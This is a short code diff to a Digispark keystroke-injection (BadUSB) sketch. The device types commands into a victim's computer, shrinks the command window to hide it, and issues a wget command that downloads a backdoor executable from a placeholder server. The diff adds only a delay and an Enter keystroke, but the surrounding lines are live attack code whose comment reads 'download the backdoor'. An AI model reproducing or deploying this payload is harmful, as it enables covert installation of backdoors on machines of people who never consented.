@@ -13,6 +13,8 @@ void loop() {
 	DigiKeyboard.sendKeyStroke(KEY_ENTER); //enter/return
 	DigiKeyboard.delay(300); // wait 300 thousandths
 	DigiKeyboard.print("MODE CON: COLS=15 LINES=1"); // reset cmd 15x1 window
+	DigiKeyboard.delay(200); // wait 200 thousandths
+	DigiKeyboard.sendKeyStroke(KEY_ENTER); //enter/return
 	DigiKeyboard.delay(400); // wait 400 thousandths
 	DigiKeyboard.print('wget http://[backdoor_server]/name_backdoor.exe'); // download the backdoor
 	DigiKeyboard.delay(300); // wait 300 thousandths
